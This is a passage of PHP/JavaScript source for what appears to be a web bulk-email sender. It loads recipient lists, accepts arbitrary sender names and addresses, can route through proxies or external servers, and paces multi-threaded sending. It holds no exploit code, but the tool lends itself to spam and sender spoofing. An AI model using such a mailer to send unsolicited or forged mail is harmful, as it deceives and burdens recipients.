	//1.6.5 (16.09.2013) прокси
	if($("#use_proxy_server").is(":checked")) params['PROXY']=$("#proxy_server_uri").val();

	if(attachedFiles.length!=0) params['files']=JSON.stringify(attachedFiles);

	if(additional.length==0)
		$(".additional").each(function(){
			additional.push(ReplaceEnum($(this).val()));
		});
	else
		$(".additional").each(function(index, value){
			if(index<additional.length) return;
			additional.push(ReplaceEnum($(this).val()));
		});
	for(i in additional) {
		params["additional["+i+"]"]=additional[i];
	}
	if(outServers.active) params["outserver"]=outServers.getServer();

	$.post('<?php print $_SERVER['PHP_SELF'];?>?send', params, function(data){
		if(data=="CAPTCHA ERROR") {
			$("#console").html("<?php tr('badcaptcha');?>");
			$("#console").css("background-color","Tomato");
						return;
		} else if(data=="OUT OF LIMIT") {
			$("#console").html("<?php tr('sendlimit');?>");
			$("#console").css("background-color","Tomato");
						return;
		}
				$("#console").html(data);
		$("#console").css("background-color","YellowGreen");
		var email=data.split(" ");
		AddDone(email[2]);
		DrawDone();
		SetProgressBar((toDoSize-toDo.length)/(toDoSize/100),(toDoSize-toDo.length)+"/"+toDoSize);
		if(timeoutNum==0)
			SendMail();
		else
			setTimeout(function(){SendMail()},timeoutNum*1000);
	});
}
function SetProgressBar(count,text) {
	var psize=parseInt($("#progressbar").css("width"))/100;
	$("#progressbar .bar").css("width",count+"%");
	$("#progressbar .barcounter").text(text);
}
function AddDone(item) {
	if(Done.length>maxDoneSize)
		Done.splice(0,1);
	Done.push(item);
}
function DrawDone() {
	$("#ext-console").html("");
	var txt="";
	for(i in Done) {
		txt=Done[i]+"<br>"+txt;
	}
	$("#ext-console").html(txt);
}
function dThreads(){
	if(threadNum==1) return;
	threadNum--;
	ShowThreads();
}
function iThreads(){
	if(threadNum==100) return;
	threadNum++;
	ShowThreads();
}
function ShowThreads() {
	$("#THREADS").text(threadNum);
}
function ShowUpload() {
	$("#FileUploadDialog").modal("show");
}
function HideUpload() {
	$("#FileUploadDialog").modal("hide");
}
function HideAttache() {
	$("#univarsalUpload").hide();
}
function showUniversalUpload() {
	if($("#univarsalUpload").css("display")=="none") {
		$("#univarsalUpload").children(".modal-body").children("iframe").attr("src","<?php print $_SERVER['PHP_SELF'];?>?upload_universal");
		$("#univarsalUpload").modal("show");
	} else $("#univarsalUpload").modal("hide");
}
function UploadClickHandler(object) {
	$(object).parent().parent().children(".modal-body").children("iframe").contents().find("form").submit();
}
window.uploadFinishedHandler=function(data) {
	if(data==null) return;
	var file=$.parseJSON(Base64.decode(data));
	attachedFiles.push(file);
	updateFileList();
	$("#univarsalUpload").modal("hide");
}
function updateFileList() {
	$("#attachedFiles").html("");
	for(var file in attachedFiles) {
		if(file=='remove') continue;
		$("#attachedFiles").html($("#attachedFiles").html()+(file!=0?"<br>":"")+"<i class='icon-file'></i> "+attachedFiles[file]['name']+" <button class='btn' onclick='removeFile("+file+");return false'><?php tr('delete',false);?></button>");
	}
}
function removeFile(id) {
	delete attachedFiles[id];
	updateFileList();
}
function TogleLoadSave() {
	if($("#LoadSaveDialog").css("display")=="none") {
		$("#LoadSaveDialog").find("iframe").attr("src","<?php print $_SERVER['PHP_SELF'];?>?loadsave");
		$("#LoadSaveDialog").modal("show");		
	} else {
		$("#LoadSaveDialog").modal("hide");
	}
}
function upload_finished(data) {
	$("#to").val(data.replace(new RegExp(" ",'g'),"\n"));
	$("#FileUploadDialog").children("iframe").attr("src","<?php print $_SERVER['PHP_SELF'];?>?upload_form");
	HideUpload();
}
function AddField(object) {
	$(object).parent().parent().after('<br><div class="input-prepend"><span class="add-on">[ADD'+AddNum+']</span></div> <input type="text" name="additional'+AddNum+'" id="additional'+AddNum+'" class="input-xlarge txtinput additional" placeholder="<?php tr('addfield2',false);?> '+AddNum+'"> <div class="input-append"><span class="add-on"><span class="addfield" onclick="AddField(this)">+</span></span>');
	$(object).parent().parent().remove();
	AddNum++;
}
function SaveData() {
	$("#LoadSaveDialog").find("iframe").attr("src","<?php print $_SERVER['PHP_SELF'];?>?savedata").load(function(){
		$("#LoadSaveDialog").find("iframe").unbind("load");
				var data="[FROM-NAME]"+$("#fromname").val()+"\n"+"[FROM-EMAIL]"+$("#frommail").val()+"\n"+"[THEME]"+$("#tema").val()+"\n"+"[TYPE]"+$("#type").val()+"\n";
				$(".additional").each(function(index, value){
			data+="[ADD"+index+"]"+$(value).val()+"\n";
		});	
				if(attachedFiles.length!=0) data+='[FILES]'+JSON.stringify(attachedFiles)+"\n";
		
				data+="[TEXT]"+$("#text").val().replaceAll("&","&amp;");
		
		$("textarea",$(this).contents()).val(data);
		$("form",$(this).contents()).submit();
	});
}
function loadsave(data) {
	var content=data.split("[TEXT]");
	$("#text").val(content[1].replaceAll("&amp;","&"));
	content=content[0].split("\n");
	for(var i in content) {
		if(content[i].indexOf("[FROM-NAME]")!=-1) {
			content[i]=content[i].replace("[FROM-NAME]","");
			$("#fromname").val(content[i]);
		} else if(content[i].indexOf("[FROM-EMAIL]")!=-1) {
			content[i]=content[i].replace("[FROM-EMAIL]","");
			$("#frommail").val(content[i]);
		} else if(content[i].indexOf("[THEME]")!=-1) {
			content[i]=content[i].replace("[THEME]","");
			$("#tema").val(content[i]);
		} else if(content[i].indexOf("[TYPE]")!=-1) {
			content[i]=content[i].replace("[TYPE]","");
			$("#type [value='"+content[i]+"']").attr("selected", "selected");
		} else if(content[i].indexOf("[FILES]")!=-1) {
			content[i]=content[i].replace("[FILES]","");
			attachedFiles=$.parseJSON(content[i]);
			updateFileList();
		} else if(content[i].indexOf("[ADD")!=-1) {
			var result=/\[ADD(\d+)\]/.exec(content[i]);
			if(AddNum<=result[1]) {
				AddField($(".addfield:last"));
			}
			content[i]=content[i].replace(result[0],"");
			$("#additional"+result[1]).val(content[i]);
		}
	}
	TogleLoadSave();
}
$(document).ready(function(){
	
	$("#prime, .prime-button").click(function(){
		$(".section-screen").hide();
		$("#prime-screen").show();
	});
	$("#help").click(function(){
		$(".section-screen").hide();
		$("#help-screen").show();
	});
	$("#settings").click(function(){
		$(".section-screen").hide();
		$("#settings-screen").show();
	});
	$(".btn-checkbox").click(function() {
		if($(this).hasClass("btn-success")) {
			$($(this).attr("data-toggle")).prop("checked",false);
			$(this).removeClass("btn-success").addClass("btn-danger").children("i").removeClass("icon-ok").addClass("icon-remove");
		} else {
			$($(this).attr("data-toggle")).prop("checked",true);
			$(this).removeClass("btn-danger").addClass("btn-success").children("i").removeClass("icon-remove").addClass("icon-ok");
		}
	});
	$("#maxDoneSize").change(function() {
		maxDoneSize=$(this).val();
	});
	alexusRange.create($("#TIMEOUT_RANGE"));
	alexusRange.change($("#TIMEOUT_RANGE"),function(range) {
		isetTimeout(alexusRange.get($(range)));
		$("#TIMEOUT").val(timeoutNum);
	});
	$("#TIMEOUT").keyup(function() {
		isetTimeout($(this).val());
		alexusRange.set($("#TIMEOUT_RANGE"),timeoutNum);
	});
	alexusRange.set($("#TIMEOUT_RANGE"),timeoutNum);
	$("[rel=tooltip]").tooltip();
	ShowThreads();
	});

function isetTimeout(val) {
	var newTimeout=parseInt(val);
	if(newTimeout<0) 
		timeoutNum=0;
	else if(newTimeout>14400)
		timeoutNum=14400;
	else
		timeoutNum=newTimeout;
}
function MakeBold() {
	wrapText("text","<b>","</b>");
}
function MakeItalic() {
	wrapText("text","<i>","</i>");
}
function MakeUnderline() {
	wrapText("text","<u>","</u>");
}
function ReplaceEnum(data) {
	return data;
	//Этот функционал перенесен в php часть
}
function MakeReverse() {
	var textArea = $("#text");
    var len = textArea[0].value.length;
    var start = textArea[0].selectionStart;
    var end = textArea[0].selectionEnd;
    var selectedText = textArea[0].value.substring(start, end);
    selectedText=selectedText.split("").reverse().join("");
    var replacement = "<span style=\"direction: rtl;unicode-bidi: bidi-override;\">" + selectedText + "</span>";
    textArea[0].value=textArea[0].value.substring(0, start) + replacement + textArea[0].value.substring(end, len);
}
function wrapText(elementID, openTag, closeTag) {
    var textArea = $('#' + elementID);
    var len = textArea[0].value.length;
    var start = textArea[0].selectionStart;
    var end = textArea[0].selectionEnd;
    var selectedText = textArea[0].value.substring(start, end);
    var replacement = openTag + selectedText + closeTag;
    textArea[0].value=textArea[0].value.substring(0, start) + replacement + textArea[0].value.substring(end, len);
}
function showPreviewWindow(link) {
	$("#preview-screen").find("iframe").attr("src", link);
	$(".section-screen").hide();
	$("#preview-screen").show();
	$(window).scrollTop(0);
}
var alexusRange={
	mouseX:0,
	newX:0,
	rangeCounter:0,
	changeHandlers:{},
	create:function(range) {
		$(range).addClass("alexus-range").addClass("well").append('<div class="crange"></div><div class="range-controller btn"></div>');
		if(alexusRange.rangeCounter==0) $(document).mouseup(alexusRange.mouseupHandler);
		$(range).children(".range-controller").mousedown(alexusRange.mousedownHandler);
		alexusRange.rangeCounter++;
		$(range).attr("ruqid",alexusRange.rangeCounter);
	},
	RangeMouseMoveHandler:function(e) {
				if(alexusRange.mouseX==0) alexusRange.mouseX=e.pageX;
		alexusRange.newX=e.pageX
		if(e.pageX!=alexusRange.mouseX)
			$(".alexus-range .range-controller[state=inmove]").each(function() {
				var max_pos=parseInt($(this).parent().css("width"))-parseInt($(this).css("width"))-2;
				var cur_pos=parseInt($(this).css("margin-left"));
				var delta=alexusRange.mouseX-alexusRange.newX;
				if(cur_pos-delta<0) 
					cur_pos=0;
				else if(cur_pos-delta>max_pos) 
					cur_pos=max_pos;
				else
					cur_pos-=delta;
				$(this).css("margin-left", cur_pos);
				$(this).parent().children(".crange").css("width",parseInt(cur_pos/(max_pos/100))+"%");
				if(alexusRange.changeHandlers[alexusRange.uniqueId($(this).parent())]!=undefined) 
					alexusRange.changeHandlers[alexusRange.uniqueId($(this).parent())]($(this).parent());
			});
		alexusRange.mouseX=alexusRange.newX;
	},
	change:function(range, handler) {
		alexusRange.changeHandlers[alexusRange.uniqueId($(range))]=handler;
	},
	mousedownHandler:function() {
				$(this).attr("state","inmove");
		$(document).mousemove(alexusRange.RangeMouseMoveHandler); 
	},
	mouseupHandler:function() {
		$(".alexus-range .range-controller[state=inmove]").attr("state","relax");
		$(document).unbind("mousemove", alexusRange.RangeMouseMoveHandler);
		alexusRange.ResetPos(); 
	},
	ResetPos:function() {
		alexusRange.mouseX=0;
	},
	get:function(range) {
		var max_pos=parseInt($(range).css("width"))-parseInt($(range).children(".range-controller").css("width"))-2;
		var cur_pos=parseInt($(range).children(".range-controller").css("margin-left"));
		var max_val=parseInt($(range).attr("max"));
		var min_val=parseInt($(range).attr("min"));
		return parseInt((max_val-min_val)*(cur_pos/max_pos))+min_val;	
	},
	set:function(range, val) {
		var max_pos=parseInt($(range).css("width"))-parseInt($(range).children(".range-controller").css("width"))-2;
		var cur_pos=parseInt($(range).children(".range-controller").css("margin-left"));
		var max_val=$(range).attr("max");
		var min_val=$(range).attr("min");
		var pos=parseInt(max_pos*(((val-min_val)/(max_val-min_val))));
		if(pos<0) 
			pos=0;
		else if(pos>max_pos) 
			pos=max_pos;
		$(range).children(".range-controller").css("margin-left",pos);
		$(range).children(".crange").css("width",parseInt(pos/(max_pos/100))+"%");
	},
	uniqueId:function(range) {
		return $(range).attr("ruqid");
	}
}
function setLang(code) {
	if(code=='ru') {
		setCookie('translation','ru',{path:"/"});
				document.location.reload();
	} else {
		setCookie('translation',code,{path:"/"});
				document.location="/"+code+"/";
				document.location.reload();
	}
}
function setCookie(name, value, props) {
    props = props || {}
    var exp = props.expires
    if (typeof exp == "number" && exp) {
        var d = new Date()
        d.setTime(d.getTime() + exp*1000)
        exp = props.expires = d
    }
    if(exp && exp.toUTCString) { props.expires = exp.toUTCString() }
 
    value = encodeURIComponent(value)
    var updatedCookie = name + "=" + value
    for(var propName in props){
        updatedCookie += "; " + propName
        var propValue = props[propName]
        if(propValue !== true){ updatedCookie += "=" + propValue }
    }
    document.cookie = updatedCookie
 
}
String.prototype.replaceAll = function(search, replace){
  return this.split(search).join(replace);
}
var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9\+\/\=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=Base64._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/\r\n/g,"\n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}}
</script>
</head>
<body>
	
<div class="modal hide fade" id="univarsalUpload">
	 <div class="modal-header">
		<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
		<h3><?php tr('attachfile');?></h3>
	</div>

	<div class="modal-body">
		<iframe src="<?php print $_SERVER['PHP_SELF'];?>?upload_universal" width="260px" height="80px" frameborder="0"></iframe>
	</div>
	<div class="modal-footer">
		<a href="#" class="btn" data-dismiss="modal"><?php tr('close');?></a>
		<a href="#" class="btn btn-primary" onclick="UploadClickHandler(this);return false"><?php tr('upload');?></a>
	</div>
</div>

	
<div class="modal hide fade" id="FileUploadDialog">
	<div class="modal-header">
		<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
		<h3><?php tr('uploadlist');?></h3>
	</div>
	<div class="modal-body">
		<iframe src="<?php print $_SERVER['PHP_SELF'];?>?upload_form" width="260px" height="80px" frameborder="0"></iframe>
	</div>
	<div class="modal-footer">
		<a href="#" class="btn" data-dismiss="modal"><?php tr('close');?></a>
		<a href="#" class="btn btn-primary" onclick="UploadClickHandler(this);return false"><?php tr('upload');?></a>
	</div>
</div>
	
<div class="modal hide fade" id="LoadSaveDialog">
	<div class="modal-header">
		<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
		<h3><?php tr('uploadtemplate');?></h3>
	</div>
	<div class="modal-body">
		<iframe src="<?php print $_SERVER['PHP_SELF'];?>?loadsave" width="260px" height="80px" frameborder="0"></iframe>
	</div>
	<div class="modal-footer">
		<a href="#" class="btn" data-dismiss="modal"><?php tr('close');?></a>
		<a href="#" class="btn btn-primary" onclick="UploadClickHandler(this);return false"><?php tr('upload');?></a>
	</div>
</div>

	
<div class="container">
	<div class="row">
		<div class="span12">
			<div class="navbar">
			    <div class="navbar-inner">
				    <a class="brand" href="#" id="hello"><?php tr('name');?> <?php echo VERSION;?></a>
				    <ul class="nav">
					    <li><a href="#prime" id="prime"><img alt="<?php tr('main',false);?>" src="data:image/png;base64,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"></a></li>
					    <li><a href="#help" id="help"><img alt="<?php tr('help',false);?>" src="data:image/png;base64,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"></a></li>
					    <li><a href="#settings" id="settings"><img alt="<?php tr('settings',false);?>" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAIDklEQVR42rVXCVDPWRyPbMpVRNgJZdFqp23LyJFCkig5KpoYd7FuhnVrtEWbZN1HlFyVSELuK5SEmErrLITI0S3F/+3n88av6bKLnW3mM//fe+/73vf6vO/3pab2DX+TJk3Smzx58tTp06f/RkyZMmXahAkTDNX+z79Ro0bpKt9jxoz5Zfv27XlXr14tJeLj49/PnDkzBEu1P4nUcnV11fjPSnnIxIkTu/n6+h5fs2bNixkzZvTj/NixY4dfuHBBvHv3ThQXF4uSkhIRGBh4Y/DgwTojRoxotHjx4gMBAQHp06ZNc/H09NRW+9Yw44DQY8eOvcaf6tWrV2Lr1q3PEQkLhPuP27dvi+zsbPH8+XOBdREREZGByBjMmjXrz7S0tNLc3Fxx/fr14mXLlsXBCPNvCbnZwYMHc4uKisTTp08l3rx5I/z8/DK8vb3/4jgrK0uCRhw9ejQPfNgJgwWNffLkiaARjx49Ui1cuDDwW8KvjVAmPnjwQGRkZEjgMPHy5UuJzMzM8nnK0IjHjx+LFy9eVJKHQcWIQO8vVdoMOXcZOXKkqZ2dXX03N7cFx48fF/fv3xf37t0Td+/eld8Ev6uCSpVvylMOEUvDeS3JD/yaA+1qVN6rV68648aNC0Heyk6cOJGzYMGCOBgUvmHDBsF8I68SKSkp8pcK6DFTwAhQRllTkJSUJHBmsru7eyC4kATivl2+fPlVJyen5tUMgLddDhw48Jq5I6ny8vLkIfTq5s2bIjk5Wdy6dUuGNT8/X5AbhYWFlcDwp6amSlmC+zlmRAoKCuT6jRs3PiIlU6oZMG/evMPp6emqK1euCNxtce3aNXkAD0pMTJRGkITMNT2ld5TjL0E58oLEY3QSEhLkPiVqijzHq1evfoWUGFTUXxsMjgOTP1y6dEkouHjxogQPomKGWZlTZC5fvlwuGxcXx6snrycVKbIV5YmNGzcWDBo0aEClCAwdOlR/9OjRUUFBQeL8+fPi3LlzEvxmjhmBs2fPls8Rhw4dEkibOHPmjGBh4hplaBSjwV/lHOL06dNi6dKlb5Bu906dOn1XNQu1LC0tG7q4uOwNDg7+ePLkScEbwEOYe36DnBKhoaEqRCwdRgcjlGs9PDwSUCmLFBnWAqaARvNbmUO5LuzXr59DJa39+/c3xuRUKA6eP39+IpRnIRWqw4cPi5iYGJk3esgx5sW2bdtUYHVw3759v1dqv62trbazs7MHGF4QGxsrjhw5IvgLwknFyt6VK1cWY+9+e3v737HHnQ6rOTg4eIaEhOST/QrJGKqoqCgZYnrCX1RFaRA63x1cWf0arrEmohGzZ88eKUsweqdOnZJnRUdHy7QoNwVzZbiiPdRgjScaRz6tZj737dvHui7BQ0igyMhIOb9r1y4xZMiQKNQH9ZpqCYrXcDSucnk6QgN4Fsf79++XhjAqGJeOHz/eUq1Pnz6eKBL5FAgLCxN79+4tBzeQbOHh4XKM3IuBAwdGQpf6Z4qZs4+PT/k5zD15UfFMgusocKXDhg2zVOvdu/cwdL3ct